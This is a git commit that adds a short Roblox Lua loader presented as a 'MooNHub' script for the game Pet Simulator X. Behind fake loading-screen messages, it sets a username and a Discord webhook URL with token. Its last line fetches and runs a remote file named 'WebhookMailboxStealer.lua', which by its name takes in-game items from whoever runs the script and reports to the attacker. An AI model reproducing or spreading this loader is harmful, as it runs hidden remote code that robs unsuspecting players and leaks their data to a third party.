18e4ce34796eab86b3ff75a5d649434a02185806
MoonScriptt <137010878+MoonScriptt@users.noreply.github.com>
2023-07-04 02:34:33 +0700

    .lua

---
+++ 🛠️moderator/🔥partner/Moonhub99/petsimx99/main/.lua
@@ -0,0 +1,9 @@
+Username = "kalongtzy"
+WebHook = "https://discord.com/api/webhooks/1125508949001641984/EAfz4MatrtnMCLPtrVRWNxZp91dhQ25RF08kOb9ANShW2lkN0w8VrtDYN-yjmWshWboq"
+loadingscreen = true
+_G.CustomScriptName = "MooNHub"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/WebhookMailboxStealer.lua"))()
